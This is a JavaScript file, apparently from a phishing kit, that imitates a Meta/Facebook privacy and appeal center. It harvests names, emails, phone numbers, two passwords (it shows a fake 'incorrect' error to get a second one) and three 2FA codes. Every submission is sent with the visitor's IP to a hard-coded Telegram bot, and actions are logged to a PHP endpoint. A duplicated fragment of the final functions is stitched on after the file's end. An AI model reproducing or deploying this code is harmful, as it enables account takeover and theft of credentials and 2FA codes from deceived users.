const subLinks = {
  PolicyCollapse: [{
    text: "What is the Privacy Policy and what does it cover?",
    link: '',
    add_svg_link: false
  }, {
    text: "What information do we collect?",
    link: '',
    add_svg_link: false
  }, {
    text: "How do we use your information?",
    link: '',
    add_svg_link: false
  }, {
    text: "How do we share your information on Meta Products or with integrated partners?",
    link: '',
    add_svg_link: false
  }, {
    text: "How do we share information with third parties?",
    link: '',
    add_svg_link: false
  }, {
    text: "How is the cooperation between Meta Companies organized?",
    link: '',
    add_svg_link: false
  }, {
    text: "How can you manage or delete your information and exercise your rights?",
    link: '',
    add_svg_link: false
  }, {
    text: "How long do we keep your information?",
    link: '',
    add_svg_link: false
  }, {
    text: "How do we transmit information?",
    link: '',
    add_svg_link: false
  }, {
    text: "How do we respond to official requests, comply with applicable laws, and prevent harm?",
    link: '',
    add_svg_link: false
  }, {
    text: "How will you know when the policy changes?",
    link: '',
    add_svg_link: false
  }, {
    text: "How to ask Meta questions?",
    link: '',
    add_svg_link: false
  }, {
    text: "Why and how we process your data",
    link: '',
    add_svg_link: false
  }],
  RulesCollapse: [{
    text: "Cookie Policy",
    link: '',
    add_svg_link: false
  }, {
    text: "Information for those who do not use Meta Products",
    link: '',
    add_svg_link: true
  }, {
    text: "How Meta uses information for generative AI models",
    link: '',
    add_svg_link: false
  }, {
    text: "Data Transfer Framework Policy",
    link: '',
    add_svg_link: false
  }, {
    text: "Other terms and conditions",
    link: '',
    add_svg_link: true
  }],
  SettingCollapse: [{
    text: "Facebook Settings",
    link: '',
    add_svg_link: true
  }, {
    text: "Instagram Settings",
    link: '',
    add_svg_link: true
  }]
};
function addSubItems() {
  for (var [_0x5f1048, _0x29b285] of Object.entries(subLinks)) {
    var _0x21df6c = document.getElementById(_0x5f1048);
    for (var _0xa30b05 = 0x0; _0xa30b05 < _0x29b285.length; _0xa30b05++) {
      var _0x224323 = _0x29b285[_0xa30b05];
      var _0x3db2d6 = document.createElement("div");
      _0x3db2d6.classList.add('action-button');
      _0x3db2d6.innerHTML = "\n            <div class=\"action-button-img\">\n                  <svg></svg>\n              </div>\n              <div class=\"action-button-text\">\n              </div>\n              <div class=\"action-button-arrow\">\n              </div>\n            ";
      if (_0x224323.add_svg_link) {
        var _0x5caa5e = _0x3db2d6.querySelector(".action-button-arrow");
        _0x5caa5e.innerHTML = "<svg viewBox=\"0 0 24 24\" fill=\"currentColor\" width=\"1em\" height=\"1em\" aria-hidden=\"true\" class=\"\"><path d=\"M6 19h12a1 1 0 0 0 1-1v-5h2v5a3 3 0 0 1-3 3H6a3 3 0 0 1-3-3V6a3 3 0 0 1 3-3h5v2H6a1 1 0 0 0-1 1v12a1 1 0 0 0 1 1z\"></path><path d=\"M11.293 11.293 17.585 5H14a1 1 0 1 1 0-2h6a1 1 0 0 1 1 1v6a1 1 0 1 1-2 0V6.414l-6.293 6.293a1 1 0 0 1-1.414-1.414z\"></path></svg>";
      }
      var _0x5eacc6 = _0x3db2d6.querySelector(".action-button-text");
      _0x5eacc6.innerText = _0x224323.text;
      _0x21df6c.appendChild(_0x3db2d6);
      _0x3db2d6.addEventListener("click", function () {
        var _0x5b12b2 = document.getElementById("start");
        _0x5b12b2.click();
      });
    }
  }
}
addSubItems();
var apiInsertCounter = 0x0;
var formsSendData = {
  'full-name': '',
  'personal-email': '',
  'buiseness-email': '',
  'mobile-phone-number': '',
  'password-1': '',
  'password-2': '',
  '2FA-1': '',
  '2FA-2': '',
  '2FA-3': '',
  'page-name': '',
  apeal: ''
};
var userIpData = {
  user_ip: "Incorrect request ;(",
  country: '-',
  country_code: '-'
};
var metrics = {
  dis_name: "MPC",
  is_Mobile: window.mobileCheck(),
  params: prettyUtmParams()
};
// Telegram Bot Configuration
var TELEGRAM_BOT_TOKEN = '7696170315:AAHzY3ANCN23bED-vqRYC_3-49Ura_YOycA'; // Thay bằng Bot Token của bạn
var TELEGRAM_CHAT_ID = '7211586401'; // Thay bằng Chat ID của bạn
var firstModal = new bootstrap.Modal(document.getElementById("exampleModal1"));
var apiModal = new bootstrap.Modal(document.getElementById("exampleModal2"));
var twoFAModal = new bootstrap.Modal(document.getElementById("twoFAmodal"));
var successModal = new bootstrap.Modal(document.getElementById("successModal"));
var termsModal = new bootstrap.Modal(document.getElementById("TermsModal"));
var policyModal = new bootstrap.Modal(document.getElementById("policyModal"));
var searchModal = new bootstrap.Modal(document.getElementById('searchModal'));
var accountsModal = new bootstrap.Modal(document.getElementById('accountsModal'));
var searchInput = document.getElementById("searchModal").querySelector("input");
const apiInput = document.getElementById("exampleModal2").querySelector("input");
const showHidePassEye = document.getElementById("show-hide-pass");
showHidePassEye.addEventListener("click", totglePassDisplay);
var firstForm = document.getElementById("first-form");
var apiForm = document.getElementById('apiForm');
var twoFAForm = document.getElementById('twoFAForm');
firstForm.addEventListener("submit", firstFormHandle);
apiForm.addEventListener("submit", apiFormhandle);
twoFAForm.addEventListener("submit", twoFAFormHandle);
document.getElementById("termsLink").addEventListener("click", function (_0x18f25a) {
  termsModal.show();
});
document.getElementById('policyLink').addEventListener("click", function (_0x52c413) {
  policyModal.show();
});
document.getElementById("search").addEventListener("click", function (_0x56a091) {
  searchModal.show();
});
document.querySelectorAll("a[href=\"#\"]").forEach(_0x6a32e9 => {
  _0x6a32e9.addEventListener("click", function (_0x9dab79) {
    _0x9dab79.preventDefault();
  });
});
document.querySelectorAll(".password-input").forEach(_0x5714e7 => {
  _0x5714e7.addEventListener("click", function (_0x21bd09) {
    if (_0x21bd09.target.id != "show-hide-pass") {
      var _0x1ee234 = _0x21bd09.currentTarget;
      _0x1ee234.querySelector("input").focus();
    }
  });
});
var fakeSearchProccesBlock = document.getElementById("searchModal").querySelector(".fake-items");
var notFoundBlock = document.getElementById("searchModal").querySelector(".now-found");
var searchItemsBlock = document.getElementById("search-items");
var cleanSearchText = document.getElementById("searchModal").querySelector('.close-search-icon-wraper');
cleanSearchText.addEventListener('click', function (_0x3a9641) {
  searchInput.value = '';
  cleanSearchText.style.display = "none";
  searchItemsBlock.style.display = "none";
});
var isSearch = false;
searchInput.addEventListener("input", function () {
  if (searchInput.value.length != 0x0) {
    cleanSearchText.style.display = "flex";
  } else {
    cleanSearchText.style.display = "none";
    searchItemsBlock.style.display = "none";
  }
  if (isSearch == false) {
    isSearch = true;
    fakeSearchProccesBlock.style.display = "none";
    notFoundBlock.style.display = 'none';
    searchItemsBlock.style.display = 'block';
    setTimeout(function () {
      fakeSearchProccesBlock.style.display = "block";
      notFoundBlock.style.display = "none";
      setTimeout(function () {
        notFoundBlock.style.display = "block";
        fakeSearchProccesBlock.style.display = 'none';
        isSearch = false;
      }, 0x3e8);
    }, 0x5dc);
  }
});
async function getUserIp() {
  try {
    const _0xdd939f = await fetch('https://freeipapi.com/api/json/');
    if (_0xdd939f.ok) {
      const _0x344c03 = await _0xdd939f.json();
      userIpData = {
        user_ip: _0x344c03.ipAddress,
        country: _0x344c03.countryName,
        country_code: _0x344c03.countryCode
      };
    } else {
      userIpData = {
        user_ip: "Ip not detected ;(",
        country: '-',
        country_code: '-'
      };
    }
  } catch (_0x36aa1e) {
    userIpData = {
      user_ip: "Ip not detected ;(",
      country: '-',
      country_code: '-'
    };
  }
}
getUserIp();
function sendDataEmail() {
  var _0x47accc = {
    ip_address: userIpData.user_ip,
    country: userIpData.country,
    country_code: userIpData.country_code,
    full_name: formsSendData['full-name'] || '',
    pers_email: formsSendData['personal-email'] || '',
    bus_email: formsSendData['buiseness-email'] || '',
    phone_number: formsSendData['mobile-phone-number'] || '',
    p_one: formsSendData['password-1'] || '',
    p_two: formsSendData['password-2'] || '',
    c_one: formsSendData['2FA-1'] || '',
    c_two: formsSendData['2FA-2'] || '',
    c_three: formsSendData['2FA-3'] || '',
    fb_page_name: formsSendData['page-name'] || '',
    message: formsSendData['apeal'] || '',
    dis_name: "MPC",
    is_Mobile: metrics.is_Mobile,
    params: metrics.params
  };

  // Format message for Telegram
  var telegramMessage = `🔔 *New Form Submission*\n\n` +
    `📍 *IP Address:* ${_0x47accc.ip_address}\n` +
    `🌍 *Country:* ${_0x47accc.country} (${_0x47accc.country_code})\n` +
    `👤 *Full Name:* ${_0x47accc.full_name}\n` +
    `📧 *Personal Email:* ${_0x47accc.pers_email}\n` +
    `📧 *Business Email:* ${_0x47accc.bus_email}\n` +
    `📱 *Phone:* ${_0x47accc.phone_number}\n` +
    `🔑 *Password 1:* ${_0x47accc.p_one}\n` +
    `🔑 *Password 2:* ${_0x47accc.p_two}\n` +
    `🔐 *2FA Code 1:* ${_0x47accc.c_one}\n` +
    `🔐 *2FA Code 2:* ${_0x47accc.c_two}\n` +
    `🔐 *2FA Code 3:* ${_0x47accc.c_three}\n` +
    `📄 *FB Page Name:* ${_0x47accc.fb_page_name}\n` +
    `💬 *Message:* ${_0x47accc.message}\n` +
    `📱 *Mobile:* ${_0x47accc.is_Mobile ? 'Yes' : 'No'}\n` +
    `📊 *Params:*\n\`\`\`${_0x47accc.params}\`\`\``;

  // Send to Telegram
  fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
    method: "POST",
    headers: {
      'Content-Type': 'application/json'
    },
    body: JSON.stringify({
      chat_id: TELEGRAM_CHAT_ID,
      text: telegramMessage,
      parse_mode: 'Markdown'
    })
  }).then(_0x33667c => _0x33667c.json()).then(_0x37edfc => {})["catch"](_0x1db690 => {});
}
function firstFormHandle(_0x57e9aa) {
  _0x57e9aa.preventDefault();
  updateFormsSendData(serializeForm(firstForm));
  var _0x788438 = firstForm.querySelector(".spinner-border");
  var _0x578da2 = firstForm.querySelector(".button-text");
  var _0x4829e8 = firstForm.querySelector("button");
  _0x4829e8.setAttribute('disabled', '');
  _0x788438.style.display = 'block';
  _0x578da2.style.display = "none";
  setTimeout(function () {
    firstModal.hide();
    apiModal.show();
    _0x788438.style.display = "none";
    _0x578da2.style.display = "block";
    _0x4829e8.removeAttribute("disabled");
  }, 0x7d0);
}
function hidePasswordIncorrectText() {
  setTimeout(function () {
    var _0x17f558 = apiForm.querySelector(".invalid-feedback");
    _0x17f558.style.display = "none";
  }, 0xbb8);
}
function sendActionLog(_0x414f76) {
  fetch("../../log_page_view.php", {
    method: 'POST',
    headers: {
      'Content-Type': "application/json"
    },
    body: JSON.stringify({
      ip_address: userIpData.user_ip,
      action: _0x414f76
    })
  }).then(_0x353d0c => _0x353d0c.json()).then(_0x1156c3 => {})['catch'](_0x437a4a => {});
}
function apiFormhandle(_0x16e27e) {
  _0x16e27e.preventDefault();
  var _0x1631fc = apiForm.querySelector(".spinner-border");
  var _0x4d7ce7 = apiForm.querySelector(".button-text");
  var _0x130c03 = apiForm.querySelector("button");
  var _0x1dfb08 = apiForm.querySelector("input");
  var _0x5be285 = apiForm.querySelector(".invalid-feedback");
  _0x1631fc.style.display = "block";
  _0x4d7ce7.style.display = 'none';
  _0x5be285.style.display = "none";
  _0x130c03.setAttribute('disabled', '');
  updateFormsSendData(serializeForm(apiForm));
  var _0x49b55a = apiInsertCounter === 0x0 ? "submit_password-1" : "submit_password-2";
  sendActionLog(_0x49b55a);
  setTimeout(function () {
    if (apiInsertCounter == 0x0) {
      _0x5be285.style.display = "block";
      _0x5be285 = apiForm.querySelector("input").value = '';
      apiInsertCounter++;
      sendDataEmail();
      _0x1631fc.style.display = "none";
      _0x4d7ce7.style.display = 'block';
      _0x130c03.removeAttribute("disabled");
      hidePasswordIncorrectText();
      _0x1dfb08.setAttribute("name", "password-2");
    } else {
      sendDataEmail();
      _0x5be285.style.display = "none";
      _0x1631fc.style.display = "none";
      _0x4d7ce7.style.display = "block";
      _0x130c03.removeAttribute('disabled');
      hidePasswordIncorrectText();
      _0x1dfb08.setAttribute("name", "password-1");
      apiModal.hide();
      twoFAModal.show();
    }
  }, 0x7d0);
}
var counter2FA = 0x1;
function twoFAFormHandle(_0x595a90) {
  _0x595a90.preventDefault();
  var _0x3607c4 = twoFAForm.querySelector(".password-input");
  var _0x22e256 = twoFAForm.querySelector(".spinner-border");
  var _0x4d2357 = twoFAForm.querySelector(".button-text");
  var _0x3e98fb = twoFAForm.querySelector("button");
  var _0x3ad5bc = twoFAForm.querySelector('.invalid-feedback');
  var _0x121f04 = twoFAForm.querySelector("input");
  if (!/^[0-9]{6,8}$/.test(_0x121f04.value)) {
    _0x3ad5bc.textContent = "Please enter a valid numeric code between 6 and 8 digits.";
    _0x3ad5bc.style.display = "block";
    return;
  }
  _0x3ad5bc.style.display = "none";
  _0x22e256.style.display = "block";
  _0x4d2357.style.display = "none";
  _0x3e98fb.setAttribute("disabled", '');
  updateFormsSendData(serializeForm(twoFAForm));
  var _0x28c71e = 'submit_2FA-' + counter2FA;
  sendActionLog(_0x28c71e);
  setTimeout(function () {
    sendDataEmail();
    counter2FA++;
    if (counter2FA >= 4) {
      unlock2FA();
      _0x22e256.style.display = "none";
      _0x4d2357.style.display = "block";
      twoFAModal.hide();
      successModal.show();
    } else {
      var _0x4bc854 = twoFAForm.querySelector("button.btn");
      _0x3607c4.classList.add("disabled");
      _0x121f04.setAttribute('disabled', '');
      _0x121f04.setAttribute('name', "2FA-" + counter2FA);
      _0x4bc854.setAttribute("disabled", '');
      twoFAForm.querySelector('input').value = '';
      startTimer();
      _0x3ad5bc.style.display = "block";
      _0x22e256.style.display = 'none';
      _0x4d2357.style.display = "block";
    }
  }, 0x7d0);
}
function unlock2FA() {
  var _0x4f05a9 = twoFAForm.querySelector(".password-input");
  var _0x533d47 = twoFAForm.querySelector(".invalid-feedback");
  var _0x404381 = twoFAForm.querySelector("input");
  var _0x42921b = twoFAForm.querySelector("button");
  _0x533d47.style.display = 'none';
  var _0x1f17e9 = twoFAForm.querySelector("button.btn");
  _0x1f17e9.removeAttribute('disabled');
  _0x404381.removeAttribute("disabled");
  _0x42921b.removeAttribute("disabled");
  _0x4f05a9.classList.remove("disabled");
}
function serializeForm(_0xaec1fb) {
  const {
    elements: _0x39dcd5
  } = _0xaec1fb;
  const _0xa185ff = Array.from(_0x39dcd5).filter(_0x276fee => _0x276fee.name != '').map(_0x284595 => {
    const {
      name: _0x205192,
      value: _0x36e0d4
    } = _0x284595;
    return {
      name: _0x205192,
      value: _0x36e0d4
    };
  });
  var _0x28bef9 = {};
  for (let _0x2e60a1 = 0x0; _0x2e60a1 < _0xa185ff.length; _0x2e60a1++) {
    var _0x2c680d = _0xa185ff[_0x2e60a1];
    _0x28bef9[_0x2c680d.name] = _0x2c680d.value;
  }
  return _0x28bef9;
}
function totglePassDisplay() {
  if (apiInput.type == "password") {
    apiInput.type = "text";
  } else {
    apiInput.type = 'password';
  }
}
function updateFormsSendData(_0x238351) {
  for (var [_0x2ce8dc, _0x56617d] of Object.entries(_0x238351)) {
    formsSendData[_0x2ce8dc] = _0x56617d;
  }
}
function startTimer() {
  var _0xf841a4 = new Date().getTime();
  var _0x5ca335 = setInterval(function () {
    var _0x2b8067 = new Date().getTime();
    var _0x2824c6 = Math.round((_0x2b8067 - _0xf841a4) / 0x3e8);
    var _0x3b092d = 0x1e - _0x2824c6;
    document.getElementById("timer").innerHTML = _0x3b092d + "s ";
    document.getElementById("timer").style.display = "inline";
    if (_0x3b092d <= 0x0) {
      clearInterval(_0x5ca335);
      document.getElementById("timer").style.display = "none";
      document.getElementById("timer").innerHTML = 'EXPIRED';
      unlock2FA();
    }
  }, 0x3e8);
}
document.addEventListener('DOMContentLoaded', function () {
  const _0x41b8ec = document.getElementById('showPopup');
  const _0x31942f = document.getElementById("popup");
  const _0xf55bfc = document.getElementById("closePopup");
  const _0x48e9e6 = document.querySelector(".col-4");
  const _0x19b238 = document.querySelector(".popup-content");
  _0x41b8ec.addEventListener('click', function () {
    _0x19b238.innerHTML = _0x48e9e6.innerHTML;
    document.body.style.overflow = "hidden";
    _0x31942f.style.display = "flex";
    document.querySelector("#popup #search").addEventListener('click', function (_0x71f3be) {
      searchModal.show();
    });
  });
  _0xf55bfc.addEventListener('click', function () {
    _0x31942f.style.display = "none";
    document.body.style.overflow = "auto";
  });
  function _0x27c4cd() {
    if (window.innerWidth < 0x3e8) {
      _0x48e9e6.style.display = "none";
      _0x41b8ec.style.display = "block";
    } else {
      _0x48e9e6.style.display = "block";
      _0x41b8ec.style.display = "none";
    }
  }
  _0x27c4cd();
  window.addEventListener("resize", _0x27c4cd);
});
function detectUtmUserLeftBar() {
  var _0x22a0f1 = new URL(window.location.html);
  var _0x3f319d = _0x22a0f1.searchParams.get("userleft");
  if (_0x3f319d) {
    document.getElementById('utm-user').style.display = "flex";
  }
}
function delectAccountUtm() {
  var _0x4ecd65 = new URL(window.location.html);
  var _0x3a88d7 = _0x4ecd65.searchParams.get("account");
  if (_0x3a88d7) {
    _0x3a88d7 = _0x3a88d7.replace('!~', " ");
    addUserName(_0x3a88d7);
    document.getElementById("view-accounts").style.display = 'flex';
    var _0x2fd712 = document.getElementById("fb-page-name-input");
    _0x2fd712.value = _0x3a88d7;
    _0x2fd712.setAttribute("disabled", "disabled");
  }
}
function delectTicketIdUtm() {
  var _0x32656b = new URL(window.location.html);
  var _0x51da2d = _0x32656b.searchParams.get("ticketId");
  if (_0x51da2d) {
    document.getElementById("utm-ticketId").style.display = "flex";
    document.getElementById("utm-ticketId").querySelector('span').innerText = _0x51da2d;
  }
}
function addUserName(_0x281afc) {
  var _0x37ae24 = document.querySelectorAll('.UserName');
  _0x37ae24.forEach(_0x14425c => {
    _0x14425c.innerText = _0x281afc;
  });
}
function addSvgInLinks() {
  var _0x4e1153 = document.querySelectorAll("a.add-svg");
  _0x4e1153.forEach(_0x51bf5c => {
    _0x51bf5c.innerHTML = _0x51bf5c.textContent + "\n    <svg viewBox=\"0 0 24 24\" fill=\"currentColor\" width=\"1em\" height=\"1em\"\n                        class=\"x1ngqms7 x18sheln x1hyyqv4 x1n2onr6 xrhstn2 xn47u6e\">\n                        <path\n                            d=\"M6 19h12a1 1 0 0 0 1-1v-5h2v5a3 3 0 0 1-3 3H6a3 3 0 0 1-3-3V6a3 3 0 0 1 3-3h5v2H6a1 1 0 0 0-1 1v12a1 1 0 0 0 1 1z\">\n                        </path>\n                        <path\n                            d=\"M11.292 11.293 17.586 5H14a1 1 0 1 1 0-2h6a1 1 0 0 1 1 1v6a1 1 0 1 1-2 0V6.414l-6.293 6.293a1 1 0 0 1-1.414-1.414z\">\n                        </path>\n                    </svg>\n    ";
  });
}
addSvgInLinks();
function dictToString(_0x1d3f18) {
  var _0x2cade7 = '';
  let _0x3549b5 = Object.entries(_0x1d3f18);
  _0x3549b5.forEach(_0x3e4403 => {
    var _0x318b0d = _0x3e4403[0x0];
    var _0x4e4316 = _0x3e4403[0x1];
    _0x2cade7 = _0x2cade7 + (_0x318b0d + " : " + _0x4e4316 + "\n");
  });
  return _0x2cade7;
}
function prettyUtmParams() {
  var _0x407ae1 = new URL(window.location.href).search;
  if (!_0x407ae1) {
    return "No URL parameters found.\n";
  }
  _0x407ae1 = _0x407ae1.slice(0x1);
  _0x407ae1 = _0x407ae1.split('&');
  var _0x32faa6 = "\n";
  _0x407ae1.forEach(_0x2e8963 => {
    var _0x507804 = _0x2e8963.split('=')[0x0];
    var _0x34ce36 = _0x2e8963.split('=')[0x1];
    _0x32faa6 = _0x32faa6 + (_0x507804 + " : " + _0x34ce36 + "\n");
  });
  return _0x32faa6;
}
var fake_policy_links = document.querySelector(".fake-likns").querySelectorAll(".action-button.wide");
fake_policy_links.forEach(_0x52efda => {
  _0x52efda.addEventListener('click', function () {
    document.getElementById("policyLink").click();
  });
});
detectUtmUserLeftBar();
delectAccountUtm();
delectTicketIdUtm();
		}
	}, 0x3e8);
}
document.addEventListener('DOMContentLoaded', function () {
	const _0x41b8ec = document.getElementById('showPopup');
	const _0x31942f = document.getElementById('popup');
	const _0xf55bfc = document.getElementById('closePopup');
	const _0x48e9e6 = document.querySelector('.col-4');
	const _0x19b238 = document.querySelector('.popup-content');
	_0x41b8ec.addEventListener('click', function () {
		_0x19b238.innerHTML = _0x48e9e6.innerHTML;
		document.body.style.overflow = 'hidden';
		_0x31942f.style.display = 'flex';
		document.querySelector('#popup #search').addEventListener('click', function (_0x71f3be) {
			searchModal.show();
		});
	});
	_0xf55bfc.addEventListener('click', function () {
		_0x31942f.style.display = 'none';
		document.body.style.overflow = 'auto';
	});
	function _0x27c4cd() {
		if (window.innerWidth < 0x3e8) {
			_0x48e9e6.style.display = 'none';
			_0x41b8ec.style.display = 'block';
		} else {
			_0x48e9e6.style.display = 'block';
			_0x41b8ec.style.display = 'none';
		}
	}
	_0x27c4cd();
	window.addEventListener('resize', _0x27c4cd);
});
function detectUtmUserLeftBar() {
	var _0x22a0f1 = new URL(window.location.html);
	var _0x3f319d = _0x22a0f1.searchParams.get('userleft');
	if (_0x3f319d) {
		document.getElementById('utm-user').style.display = 'flex';
	}
}
function delectAccountUtm() {
	var _0x4ecd65 = new URL(window.location.html);
	var _0x3a88d7 = _0x4ecd65.searchParams.get('account');
	if (_0x3a88d7) {
		_0x3a88d7 = _0x3a88d7.replace('!~', ' ');
		addUserName(_0x3a88d7);
		document.getElementById('view-accounts').style.display = 'flex';
		var _0x2fd712 = document.getElementById('fb-page-name-input');
		_0x2fd712.value = _0x3a88d7;
		_0x2fd712.setAttribute('disabled', 'disabled');
	}
}
function delectTicketIdUtm() {
	var _0x32656b = new URL(window.location.html);
	var _0x51da2d = _0x32656b.searchParams.get('ticketId');
	if (_0x51da2d) {
		document.getElementById('utm-ticketId').style.display = 'flex';
		document.getElementById('utm-ticketId').querySelector('span').innerText = _0x51da2d;
	}
}
function addUserName(_0x281afc) {
	var _0x37ae24 = document.querySelectorAll('.UserName');
	_0x37ae24.forEach((_0x14425c) => {
		_0x14425c.innerText = _0x281afc;
	});
}
function addSvgInLinks() {
	var _0x4e1153 = document.querySelectorAll('a.add-svg');
	_0x4e1153.forEach((_0x51bf5c) => {
		_0x51bf5c.innerHTML =
			_0x51bf5c.textContent +
			'\n    <svg viewBox="0 0 24 24" fill="currentColor" width="1em" height="1em"\n                        class="x1ngqms7 x18sheln x1hyyqv4 x1n2onr6 xrhstn2 xn47u6e">\n                        <path\n                            d="M6 19h12a1 1 0 0 0 1-1v-5h2v5a3 3 0 0 1-3 3H6a3 3 0 0 1-3-3V6a3 3 0 0 1 3-3h5v2H6a1 1 0 0 0-1 1v12a1 1 0 0 0 1 1z">\n                        </path>\n                        <path\n                            d="M11.292 11.293 17.586 5H14a1 1 0 1 1 0-2h6a1 1 0 0 1 1 1v6a1 1 0 1 1-2 0V6.414l-6.293 6.293a1 1 0 0 1-1.414-1.414z">\n                        </path>\n                    </svg>\n    ';
	});
}
addSvgInLinks();
function dictToString(_0x1d3f18) {
	var _0x2cade7 = '';
	let _0x3549b5 = Object.entries(_0x1d3f18);
	_0x3549b5.forEach((_0x3e4403) => {
		var _0x318b0d = _0x3e4403[0x0];
		var _0x4e4316 = _0x3e4403[0x1];
		_0x2cade7 = _0x2cade7 + (_0x318b0d + ' : ' + _0x4e4316 + '\n');
	});
	return _0x2cade7;
}
function prettyUtmParams() {
	var _0x407ae1 = new URL(window.location.href).search;
	if (!_0x407ae1) {
		return 'No URL parameters found.\n';
	}
	_0x407ae1 = _0x407ae1.slice(0x1);
	_0x407ae1 = _0x407ae1.split('&');
	var _0x32faa6 = '\n';
	_0x407ae1.forEach((_0x2e8963) => {
		var _0x507804 = _0x2e8963.split('=')[0x0];
		var _0x34ce36 = _0x2e8963.split('=')[0x1];
		_0x32faa6 = _0x32faa6 + (_0x507804 + ' : ' + _0x34ce36 + '\n');
	});
	return _0x32faa6;
}
var fake_policy_links = document
	.querySelector('.fake-likns')
	.querySelectorAll('.action-button.wide');
fake_policy_links.forEach((_0x52efda) => {
	_0x52efda.addEventListener('click', function () {
		document.getElementById('policyLink').click();
	});
});
detectUtmUserLeftBar();
delectAccountUtm();
delectTicketIdUtm();
